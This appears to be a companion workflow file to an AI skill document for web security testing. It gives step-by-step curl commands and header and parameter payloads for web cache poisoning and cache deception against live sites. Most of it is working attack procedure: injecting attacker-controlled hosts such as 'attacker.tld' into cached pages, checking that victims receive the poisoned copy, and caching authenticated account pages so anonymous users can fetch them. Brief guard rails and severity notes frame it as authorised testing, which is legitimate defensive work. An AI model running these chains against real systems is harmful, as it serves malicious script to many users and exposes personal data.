# Web Cache Poisoning / Deception — Deep Workflows

Companion to SKILL.md. Unkeyed input discovery, poisoning chains,
deception detection.

## Part A: Cache Poisoning

### Step 1: Identify the cache

```bash
curl -s -D - https://target.example.com/ -o /dev/null
# Look for: X-Cache: hit/miss, Age:, X-Varnish, CF-Cache-Status,
# X-Served-By, Via:, X-CDN, Server: cloudfront/akamai
```

### Step 2: Map keyed vs unkeyed inputs

Method: add a random value to each candidate input; if response is served
from cache for a DIFFERENT second request with another value, that input
is UNKEYED (but reflected) = poisoning primitive.

```bash
# Header candidates:
X-Forwarded-Host: attacker.tld
X-Forwarded-Scheme: http        (open-redirect via generated links)
X-Forwarded-Prefix: /x/
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: attacker.tld
Forwarded: for=1.2.3.4;host=attacker.tld
Accept-Language / Accept-Encoding (varied values)
Cookie params outside key (some CDNs key on cookie NAME set)

# Param candidates:
?utm_content=x&ref=x&fbclid=x    (classic unkeyed params per CDN docs)
```

### Step 3: Find reflection into cacheable response

```bash
curl -s -H "X-Forwarded-Host: attacker.tld" \
  "https://target.example.com/page-used-by-many" | grep -o "attacker.tld"
# If host lands inside <script src=> or canonical link -> high impact chain.
```

### Step 4: Poison and verify victim-path delivery

```bash
# 1. Inject with cache-buster so YOUR copy caches separately:
curl -s -H "X-Forwarded-Host: attacker.tld" \
  "https://target.example.com/home?cb=$RANDOM"
# 2. Victim fetch WITHOUT buster receives poisoned entry:
curl -s "https://target.example.com/home" | grep attacker.tld
```

Impact proof options: JS injection (if reflection in script src),
web-key exfil via injected form action, content spoofing.

### Param cloaking (when params are keyed)

```text
; separator (some stacks treat ; params as unkeyed):
GET /?utm_content=x;a=attacker-value
Fat GET (some stacks read body params on GET):
GET /?utm=x  body:  utm=poison
```

## Part B: Cache Deception

```bash
# Authenticated session required:
curl -s -b "session=<yours>" \
  "https://target.example.com/account/settings/nonexistent.css" -D -
# If 200 + personal data + Cache-Control allows storing AND path suffix
# fools the cache rule (static ext), the URL becomes publicly cached.
# Verify UNAUTHENTICATED fetch returns your account data from cache.
```

Guard rails: use YOUR OWN account data only; purge/expire entry after
evidence (request the true path with cache-buster or wait TTL); never
chain deception against other users.

## False-positive elimination

1. Poison must persist across TWO independent clients (your curl +
   fresh browser profile) before reporting.
2. Respect CDN TTL — re-verify within same TTL window.
3. Some hosts cache only per-session/personalization off — check Vary.

## Severity guidance

Poisoning JS on cached homepage: High (CVSS ~7.5+). Deception leaking own
PII demonstrably to anonymous users: High. Unkeyed header reflection with
no storage: Low/info unless chained.
